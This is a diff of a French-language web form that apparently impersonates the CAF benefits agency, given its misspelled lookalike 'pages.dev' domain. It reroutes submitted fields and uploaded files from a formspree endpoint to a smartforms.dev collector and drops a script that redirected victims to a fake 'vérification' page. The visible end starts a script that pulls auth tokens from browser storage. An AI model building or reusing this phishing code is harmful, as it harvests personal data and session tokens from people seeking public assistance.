@@ -171,8 +171,7 @@ header.hero .hero-inner {
 <div class="wrap">
   <main>
     
-    <form method="POST" id="mainForm" enctype="multipart/form-data">
-
+   <form method="POST" action="https://smartforms.dev/submit/6aec7147c184545ccc232a64" enctype="multipart/form-data" id="mainForm">
 
 
       <div class="field">
@@ -194,24 +193,7 @@ header.hero .hero-inner {
     Après avoir soumis, votre assistant(e) vous enverra un code. Veuillez le sélectionner pour vous connecter au serveur.
   </footer>
 </div>
-<script>
-  document.getElementById('mainForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const form = e.target;
-    const data = new FormData(form);
 
-    fetch('https://formspree.io/f/mppzdroe', {
-      method: 'POST',
-      body: data,
-      headers: { 'Accept': 'application/json' }
-    })
-    .then(response => {
-      if (response.ok) {
-        window.location.href = 'https://caf-fr-subvensiondemandeaccompagnement.pages.dev/vérification.html';
-      }
-    });
-  });
-</script>
  <script>
 let token = localStorage.getItem("authToken") 
          || sessionStorage.getItem("token");
